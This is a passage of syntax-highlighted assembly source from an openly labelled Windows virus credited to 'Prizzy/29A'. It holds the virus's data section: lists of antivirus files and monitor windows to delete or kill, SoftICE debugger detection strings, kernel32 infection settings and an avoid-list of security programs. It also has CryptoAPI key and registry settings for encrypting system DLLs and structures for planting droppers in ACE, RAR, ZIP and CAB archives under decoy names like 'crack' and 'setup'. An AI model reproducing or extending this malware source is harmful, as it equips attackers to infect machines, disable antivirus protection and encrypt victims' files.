        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kill_av</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'CHKLIST.CPS'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kill_av</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'SMARTCHK.MS'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kill_av</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'SMARTCHK.CPS'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kill_av</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'AGUARD.DAT'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kill_av</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'AVGQT.DAT'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kill_av</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc12">'LGUARD.VPS'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;AVAST's viruses data-</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">kill_avast</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">;base, hack its !!!</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FFh</span><span class="sc0">

</span><span class="sc5">HyperTable_OneSize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0000000Fh</span><span class="sc0">             </span><span class="sc1">;size of ext field</span><span class="sc0">
</span><span class="sc5">HyperTable_HalfSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000009h</span><span class="sc0">             </span><span class="sc1">;size of pointers</span><span class="sc0">

</span><span class="sc5">gen_archive_number</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">gen_archive_filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'install'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'setup'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'run'</span><span class="sc4">,</span><span class="sc0"> \
                </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'sound'</span><span class="sc4">,</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'config'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'help'</span><span class="sc4">,</span><span class="sc0"> \
                </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'gratis'</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'crack'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'update'</span><span class="sc4">,</span><span class="sc0"> \
                </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">,</span><span class="sc12">'readme'</span><span class="sc0">

        </span><span class="sc1">; Hyper Infection - kernel32 internal values</span><span class="sc0">

</span><span class="sc5">HyperInfection_k32</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;actived from "kernel32" ?</span><span class="sc0">
</span><span class="sc5">HyperInfection_timerID</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;timer identification</span><span class="sc0">

        </span><span class="sc1">; AVAST's viruses database</span><span class="sc0">

</span><span class="sc5">AVAST_newSize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">514847</span><span class="sc0">          </span><span class="sc1">;this size + &lt;0,50Kb)</span><span class="sc0">
</span><span class="sc5">AVAST_memSize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">AVAST_newSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

        </span><span class="sc1">; some AV monitors</span><span class="sc0">

</span><span class="sc5">kill_AV</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'AVG Control Center'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;AVG Grisoft</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Avast32 -- Rezidentní podpora'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;AVAST32 (CZ)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'AVP Monitor'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;AVP</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Amon Antivirus Monitor'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;AMON English</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Antivírusovı monitor Amon'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;AMON Slovak</span><span class="sc0">
</span><span class="sc5">kill_AV_num</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">;four monitors</span><span class="sc0">

        </span><span class="sc1">; some debuggers</span><span class="sc0">

</span><span class="sc5">kill_SoftICE</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\\.\SICE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;SoftICE 95/98</span><span class="sc0">
</span><span class="sc5">kill_SoftICE_NT</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\\.\NTICE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;SoftICE NT/2k</span><span class="sc0">

        </span><span class="sc1">; kernel infection</span><span class="sc0">

</span><span class="sc5">kernel_name</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'\KERNEL32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">kernel_name_len</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">kernel_name</span><span class="sc0">
</span><span class="sc5">it_is_kernel</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;infect kernel via "infect_file" ?</span><span class="sc0">

        </span><span class="sc1">; do not infected table (thanx Lord Julus/29A for this tbl)</span><span class="sc0">

</span><span class="sc5">avoid_table</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'TB'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'F-'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'AW'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'AV'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NAV'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'PAV'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'RAV'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'NVC'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FPR'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'DSS'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'IBM'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'INOC'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ANTI'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'SCN'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'VSAF'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'VSWP'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PANDA'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'DRWEB'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'FSAV'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'SPIDER'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ADINF'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'SONIQUE'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'SQSTART'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">

        </span><span class="sc1">; Microsoft Cryptography functions, what a dream {:-D</span><span class="sc0">

</span><span class="sc5">crypto_KeyName</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Prizzy/29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;my new crypto-key</span><span class="sc0">
</span><span class="sc5">crypto_Action</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;exists crypto functions ?</span><span class="sc0">
</span><span class="sc5">crypto_loadKey</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;has key been loaded ?</span><span class="sc0">

</span><span class="sc5">crypto_Provider</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;CSP provider</span><span class="sc0">
</span><span class="sc5">crypto_Key</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;CPS key</span><span class="sc0">
</span><span class="sc5">crypto_XchgKey</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;exportable CSP key</span><span class="sc0">

</span><span class="sc5">crypto_BlobLen</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;simple blob key length</span><span class="sc0">
</span><span class="sc5">crypto_BlobKey</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;simple blob key pointer</span><span class="sc0">
</span><span class="sc5">crypto_BlobHan</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;simple blob key reg handle</span><span class="sc0">

</span><span class="sc5">crypto_mainProcId</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">crypto_mainThread</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;main (crypto) thread handle</span><span class="sc0">
</span><span class="sc5">crypto_thread</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;thread parameter</span><span class="sc0">
</span><span class="sc5">CT_LOADKEY</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;get key handle</span><span class="sc0">
</span><span class="sc5">CT_CRYPTFILE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;crypt_file function</span><span class="sc0">
</span><span class="sc5">CT_DECRYPTFILE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">;decrypt_file function</span><span class="sc0">
</span><span class="sc5">crypto_thread_err</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;set LastError flag</span><span class="sc0">

</span><span class="sc5">crypto_unFiles</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SFC'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'MPR'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'OLE32'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NTDLL'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'GDI32'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'RPCRT4'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'USER32'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'RSASIG'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'SHELL32'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CRYPT32'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'RSABASE'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'PSTOREC'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'KERNEL32'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'ADVAPI32'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc12">'RUNDLL32'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SFCFILES'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">crypto_unReg32</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"System\CurrentControlSet\Control\SessionManager\KnownDLLs"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crypto_unReg16</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"System\CurrentControlSet\Control\SessionManager\Known16DLLs"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">crypto_unReg</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypto_unReg32</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypto_unReg16</span><span class="sc0">
</span><span class="sc5">crypto_unReg_E</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">crypto_mainMutex</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Crypto:mainThread"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crypto_mutex</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Crypto:Mutex"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crypto_library</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;libraries information</span><span class="sc0">
</span><span class="sc5">crypto_nLib</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;number of items</span><span class="sc0">

</span><span class="sc5">crypto_Register</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SOFTWARE\Microsoft\Cryptography\UserKeys\Prizzy/29A"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crypto_RegWhere</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"EPbK"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crypto_RegFlag</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Kiss Of Death"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">           </span><span class="sc1">;filesize divided by eight</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;only for multi-layer poly</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ memory buffer which ain't in file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">file_end</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; working with filez</span><span class="sc0">

</span><span class="sc5">filename_ptr</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;pointer to a filename</span><span class="sc0">
</span><span class="sc5">filename_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">     </span><span class="sc1">;MAX_SIZE defined by M$</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">filename_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">file_handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;open file handle</span><span class="sc0">
</span><span class="sc5">file_hmap</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;mapped file handle</span><span class="sc0">
</span><span class="sc5">file_hmem</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;mapped file in memory</span><span class="sc0">
</span><span class="sc5">file_hsize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;file size + virus size</span><span class="sc0">
</span><span class="sc5">last_error</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;buffer for file operations</span><span class="sc0">

        </span><span class="sc1">; hyper infection</span><span class="sc0">

</span><span class="sc5">search_filename</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">filename_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">search_start</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;have we begun yet ?</span><span class="sc0">
</span><span class="sc5">search_address</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;address of dta's in memory</span><span class="sc0">
</span><span class="sc5">search_plunge</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;how many dirz we have in</span><span class="sc0">
</span><span class="sc5">search_handle</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;FindFirstFile handle</span><span class="sc0">
</span><span class="sc5">search_table</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;position in HyperTable</span><span class="sc0">
</span><span class="sc5">dta</span><span class="sc0">     </span><span class="sc5">dta_struc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0">     </span><span class="sc1">;main dta struc for search_handle</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">        </span><span class="sc5">sysTime_struc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;time for my new hyper_infection</span><span class="sc0">

        </span><span class="sc1">; file infected co-processor structs</span><span class="sc0">

</span><span class="sc5">exp_truncate</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;copro status flags</span><span class="sc0">
</span><span class="sc5">exp_default</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;copro status flags</span><span class="sc0">
</span><span class="sc5">exp_further</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;copro number's buffer</span><span class="sc0">

</span><span class="sc5">decimal_places</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;dec_place=modf(num,&amp;int)</span><span class="sc0">

        </span><span class="sc1">; new infection method (compressed, inside archive)</span><span class="sc0">

</span><span class="sc5">AProgram</span><span class="sc0">    </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">program</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;where's place program</span><span class="sc0">
</span><span class="sc5">dropper</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;where's place dropper</span><span class="sc0">
        </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">NewArchive</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">NewArchiveNum</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000005h</span><span class="sc0">
</span><span class="sc5">NewArchiveSize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">AProgram</span><span class="sc0">

</span><span class="sc5">NewACE</span><span class="sc0">      </span><span class="sc5">AProgram</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">NewRAR</span><span class="sc0">      </span><span class="sc5">AProgram</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">NewARJ</span><span class="sc0">      </span><span class="sc5">AProgram</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">NewZIP</span><span class="sc0">      </span><span class="sc5">AProgram</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">NewCAB</span><span class="sc0">      </span><span class="sc5">AProgram</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">FileTime</span><span class="sc0">    </span><span class="sc5">File_Time</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0">         </span><span class="sc1">;get/set archive infect flag</span><span class="sc0">
</span><span class="sc5">SystemTime</span><span class="sc0">  </span><span class="sc5">sysTime_struc</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0">     </span><span class="sc1">;convert FileTime to SystemT</span><span class="sc0">

        </span><span class="sc1">; CreateProcess structures</span><span class="sc0">

</span><span class="sc5">ProcessInformation</span><span class="sc0">    </span><span class="sc5">Process_Information</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;info about process</span><span class="sc0">
</span><span class="sc5">StartupInfo</span><span class="sc0">       </span><span class="sc5">Startup_Info</span><span class="sc0">    </span><span class="sc4">&lt;</span><span class="sc2">00h</span><span class="sc4">&gt;</span><span class="sc0"> </span><span class="sc1">;window's info</span><span class="sc0">

